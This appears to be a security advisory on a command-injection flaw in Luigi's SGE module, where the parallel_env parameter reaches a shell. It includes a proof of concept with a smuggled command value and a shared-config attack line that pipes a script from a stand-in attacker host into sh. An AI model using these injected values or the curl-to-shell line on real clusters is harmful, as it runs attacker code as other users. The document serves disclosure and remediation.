# Finding: Luigi SGE Command Injection

## Package Information

| Field      | Value                                        |
| ---------- | -------------------------------------------- |
| Package    | luigi                                        |
| Version    | 3.7.3 (latest at time of research)           |
| PyPI       | https://pypi.org/project/luigi/              |
| GitHub     | https://github.com/spotify/luigi             |
| Maintainer | Spotify                                      |
| File       | `luigi/contrib/sge.py`                       |
| Lines      | 144, 298–303                                 |

---

## Summary

The `parallel_env` parameter of `SGEJobTask` is inserted directly into a shell command string with no sanitization, then executed via `subprocess.check_output()` with `shell=True`. An attacker who can control this parameter — through the CLI, a config file, or code — can inject arbitrary shell commands that execute in the context of the user running the Luigi workflow.

---

## CVSS Score

**7.8 — High**

| Metric               | Value       | Rationale                                                    |
| -------------------- | ----------- | ------------------------------------------------------------ |
| Attack Vector        | Local       | Attacker must be able to set Luigi parameters (CLI/config)   |
| Attack Complexity    | Low         | No special conditions; inject directly into parameter value  |
| Privileges Required  | Low         | Must be able to run a Luigi SGE task                         |
| User Interaction     | None        | No other user needs to take any action                       |
| Scope                | Unchanged   | Commands execute as the same user running the workflow       |
| Confidentiality      | High        | Arbitrary read of files accessible to the running user       |
| Integrity            | High        | Arbitrary write, file deletion, or code execution            |
| Availability         | High        | Can kill processes or delete files needed by the workflow    |

CVSS 3.1 Vector: `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`

---

## Vulnerability Details

### Source (User-Controlled Input)

```python
# luigi/contrib/sge.py, line 183
parallel_env = luigi.Parameter(default='orte', significant=False)
```

`luigi.Parameter()` accepts values from:
- **CLI**: `--parallel-env 'orte; <payload>'`
- **Config file**: `luigi.cfg` → `[SGEJobTask] parallel-env = orte; <payload>`
- **Code**: `MyTask(parallel_env='orte; <payload>')`

### Sink (Dangerous Execution)

```python
# luigi/contrib/sge.py, line 303
output = subprocess.check_output(submit_cmd, shell=True)
```

### Vulnerable Code Path

```
SGEJobTask.run()
  └─ SGEJobTask._run_job()                          # line 284
       └─ _build_qsub_command(..., pe=self.parallel_env, ...)  # line 298
            └─ qsub_template.format(..., pe=pe, ...)           # line 144–147
       └─ subprocess.check_output(submit_cmd, shell=True)      # line 303
```

### Root Cause

`_build_qsub_command` constructs the shell string using `str.format()`:

```python
def _build_qsub_command(cmd, job_name, outfile, errfile, pe, n_cpu):
    qsub_template = """echo {cmd} | qsub -o ":{outfile}" -e ":{errfile}" -V -r y -pe {pe} {n_cpu} -N {job_name}"""
    return qsub_template.format(
        cmd=cmd, job_name=job_name, outfile=outfile, errfile=errfile,
        pe=pe, n_cpu=n_cpu)
```

`pe` is inserted as a raw string with no escaping or validation. Because the result is passed to `subprocess.check_output()` with `shell=True`, the shell interprets any metacharacters present in the value.

---

## Proof of Concept

### Reproduction Steps

```bash
git clone https://github.com/spotify/luigi
cd luigi
pip install -e .
```

```python
# poc/luigi_sge_poc.py
import luigi
import tempfile
from luigi.contrib.sge import SGEJobTask  # may require mrrunner stub; see poc file

class MaliciousTask(SGEJobTask):
    def work(self): pass
    def output(self): return luigi.LocalTarget('/tmp/dummy')

task = MaliciousTask(
    parallel_env='orte; touch /tmp/luigi_pwned #',
    no_tarball=True,
)
task.tmp_dir = tempfile.mkdtemp()
task._run_job()
```

### Injected Command

Normal (`parallel_env='orte'`):
```
echo python runner.py "/tmp/task" | qsub -o ":/tmp/task/job.out" -e ":/tmp/task/job.err" -V -r y -pe orte 2 -N MaliciousTask
```

With injection (`parallel_env='orte; touch /tmp/luigi_pwned #'`):
```
echo python runner.py "/tmp/task" | qsub -o ":/tmp/task/job.out" -e ":/tmp/task/job.err" -V -r y -pe orte; touch /tmp/luigi_pwned # 2 -N MaliciousTask
```

The `;` terminates the `qsub` call early. `touch /tmp/luigi_pwned` executes as a separate shell command. The `#` comments out the remaining arguments.

### Observed Output

```
[*] Task parallel_env = 'orte; touch /tmp/luigi_e2e_pwned #'
[*] Calling SGEJobTask._run_job() ...

[*] _run_job() raised after injection point: IndexError: list index out of range

[+] SUCCESS: End-to-end injection confirmed.
    Proof file created by SGEJobTask._run_job(): /tmp/luigi_e2e_pwned
```

The `IndexError` is expected — it occurs at line 304 when Luigi tries to parse the empty qsub output. The injection at line 303 already executed.

---

## Attack Scenario — luigi.cfg in Shared Cluster

Luigi explicitly supports `luigi.cfg` as a first-class configuration mechanism and documents it in the SGE module:

```ini
[SGEJobTask]
parallel-env = orte
```

In shared SGE cluster environments — the primary deployment target of this module — `luigi.cfg` is commonly stored in a shared project directory accessible to multiple users. A cluster user with write access to that directory can set:

```ini
[SGEJobTask]
parallel-env = orte; curl http://attacker.example.com/shell.sh | sh
```

The next time any user runs an `SGEJobTask` in that project, the payload executes in their process context without any warning or error.

---

## Impact

If untrusted input reaches the `parallel_env` parameter — through a shared `luigi.cfg`, a CI/CD pipeline that accepts external configuration, or any interface that passes user-supplied values to Luigi parameters — arbitrary shell commands execute in the context of the Luigi process. This is the expected deployment environment for the SGE module: multi-user shared HPC clusters where config files are not exclusively developer-controlled.

---

## Remediation

The fix requires two changes: remove `shell=True` and pass arguments as a list so the OS never invokes a shell interpreter. The current pattern pipes through `/bin/sh`; instead, pass the job command directly to `qsub` via stdin using `input=`:

```python
# Safe: no shell, no string formatting, arguments passed as list
import shlex

cmd_list = [
    "qsub",
    "-o", f":{outfile}",
    "-e", f":{errfile}",
    "-V",
    "-r", "y",
    "-pe", pe,       # shell metacharacters in pe are now inert
    str(n_cpu),
    "-N", job_name,
]
output = subprocess.check_output(cmd_list, input=cmd.encode())
```

With this form, `pe` is passed as a literal argument to `qsub` — the OS never sees it as shell syntax. No sanitization regex is needed.

---

## References

- [Luigi SGE module source](https://github.com/spotify/luigi/blob/master/luigi/contrib/sge.py)
- [Python subprocess security](https://docs.python.org/3/library/subprocess.html#security-considerations)
- [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
